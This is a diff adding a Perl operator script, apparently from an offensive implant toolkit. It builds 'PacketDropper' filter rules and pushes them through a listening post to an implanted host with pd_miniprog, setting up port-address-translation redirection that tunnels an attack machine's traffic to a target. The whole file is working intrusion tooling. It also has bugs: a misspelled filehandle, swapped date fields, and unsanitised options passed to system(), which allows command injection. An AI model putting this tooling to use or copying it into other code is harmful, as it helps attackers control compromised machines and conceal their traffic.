@@ -1,0 +1,148 @@
+#! /usr/bin/env perl
+
+use Getopt::Long;
+
+GetOptions(
+    "lp=s",            "implant=s",
+    "idkey=s",         "sport=s",
+    "dport=s",         "lptimeout=s",
+    "bsize=s",         "cmd=s",
+    "attack_ip=s",     "intermediate_ip=s",
+    "attack_int=s",    "attack_port=s",
+    "target_int=s",    "port_offset=s",
+    "trans_timeout=s", "pat_timeout=s",
+    "logdir=s",        "orig_dest_ip=s"
+);
+
+sub usage {
+
+    print
+"\n\nstart_redirector.pl creates and uploads PacketDropper filter files and/or starts a local listener to perform encryption and redirection.\n\n";
+
+    print
+"Usage: pd_start_pat.pl --lp <LP ip> --implant <Impant ip> --idkey <Implant key file>\n";
+    print
+"       [--lptimeout <lp timeout>] [--bsize <benign size>] --cmd <command number>\n";
+    print
+      "       --attack_ip <attack_ip> --intermediate_ip <intermediate_ip>\n";
+    print
+"       --attack_int <interface> --target_int <interface> --port_offset <port offset>\n";
+    print
+"       --trans_timeout <timeout> --pat_timeout <seconds> --attack_port <port>\n";
+    print "       --target_port <port> [--logdir <logdir>]\n\n";
+    print "   --lp <LP ip>\n";
+    print "       IP Address of the LP box\n\n";
+    print "   --implant <Impant ip>\n";
+    print "       IP Address of the Implanted box\n\n";
+    print "   --idkey <Implant key file>\n";
+    print "       File containing key information for the implant\n\n";
+    print "  [--lptimeout <lp timeout>]\n";
+    print
+"       The amount of time (in seconds) the LP should wait for a response\n\n";
+    print "  [--bsize <benign size>]\n";
+    print
+"       (Optional) The max packet size for packets traveling between the LP and implant\n\n";
+    print "   --cmd <command number>\n";
+    print "       The command number of the PD_addRuleHandler in hex\n\n";
+    print "   --intermediate_ip <ip>\n";
+    print "       IP address of the intermediate machine\n\n";
+    print "   [--orig_dest_ip <ip>]\n";
+    print
+"       IP address of the original destination IP for packets coming from the target\n\n";
+    print "   --attack_ip <ip>\n";
+    print "       IP address of the attack machine\n\n";
+    print "   --attack_int <ip>\n";
+    print
+"       Number of the interface that the attack machine is connected to\n\n";
+    print "   --attack_port <ip>\n";
+    print "       Port to tunnel to on the target machine\n\n";
+    print "   --target_int <ip>\n";
+    print
+"       Number of the interface that the target machine is connected to\n\n";
+    print "   --port_offset <port>\n";
+    print "       First port to use when building the tranlations\n\n";
+    print "   --trans_timeout <port>\n";
+    print "       Timeout for individual entries in the translation table\n\n";
+    print "  --pat_timeout <seconds>\n";
+    print "       Overall timeout for the PAT action\n\n";
+    print "  [--logdir <logdir>]\n";
+    print
+      "       (Optional) Directory to store log files in (defaults to .)\n\n";
+}
+
+if (   !defined($opt_lp)
+    || !defined($opt_implant)
+    || !defined($opt_sport)
+    || !defined($opt_dport)
+    || !defined($opt_cmd)
+    || !defined($opt_target_int)
+    || !defined($opt_intermediate_ip)
+    || !defined($opt_attack_int)
+    || !defined($opt_port_offset)
+    || !defined($opt_trans_timeout)
+    || !defined($opt_attack_ip)
+    || !defined($opt_pat_timeout) )
+{
+    usage();
+}
+else {
+
+    if ( !defined($opt_orig_dest_ip) ) {
+        $opt_orig_dest_ip = $opt_attack_ip;
+    }
+
+    ( $sec, $min, $hour, $day, $month, $year ) = localtime(time);
+
+    $year += 1900;
+
+    $pat_filt_filename = sprintf( "%s/%s/pat_filter_%04d%02d%02d_%02d%02d%02d",
+        $opt_logdir, $opt_implant, $year, $day, $month, $hour, $min, $sec );
+
+    if ( !defined($opt_attack_port) ) {
+        $opt_attack_port = 0;
+    }
+
+    open( PAT_FILT, ">", $pat_filt_filename ) or system("mkdir $opt_implant");
+    open( PAT_FILT, ">", $pat_filt_filename )
+      or die "Could not create PAT filter file\n";
+
+    printf( PAT_FILT "1 %s %s 6 %s %s %s %s %s %s %s dst host %s",
+        ($opt_target_int), $opt_pat_timeout, $opt_intermediate_ip,
+        $opt_orig_dest_ip, $opt_attack_ip, ($opt_attack_int),
+        $opt_port_offset, $opt_attack_port, $opt_trans_timeout,
+        $opt_orig_dest_ip
+    );
+
+    printf( PAT_FILT "\n2 %s %s 7 %s src host %s and dst host %s",
+        ($opt_attack_int), $opt_pat_timeout, $opt_port_offset,
+        $opt_attack_ip,    $opt_intermediate_ip
+    );
+
+    if ( $opt_attack_port != 0 ) {
+        printf( PAT_FILE " src port %s", $opt_attack_port );
+    }
+
+    printf( PAT_FILE "\n" );
+
+    close(PAT_FILT);
+
+    $pd_mini = sprintf(
+"./pd_miniprog-3110 --lp %s --implant %s --idkey %s --sport %s --dport %s ",
+        $opt_lp, $opt_implant, $opt_idkey, $opt_sport, $opt_dport, );
+
+    if ( defined($opt_lptimeout) ) {
+        $pd_mini = sprintf( "%s --lptimeout %s", $pd_mini, $opt_lptimeout );
+    }
+
+    if ( defined($opt_bsize) ) {
+        $pd_mini = sprintf( "%s --bsize %s", $pd_mini, $opt_bsize );
+    }
+
+    if ( defined($opt_logdir) ) {
+        $pd_mini = sprintf( "%s --logdir %s", $pd_mini, $opt_logdir );
+    }
+
+    print "$pd_mini  --cmd $opt_cmd --name add_rule --arg $pat_filt_filename\n";
+    system("$pd_mini  --cmd $opt_cmd --name add_rule --arg $pat_filt_filename");
+
+}
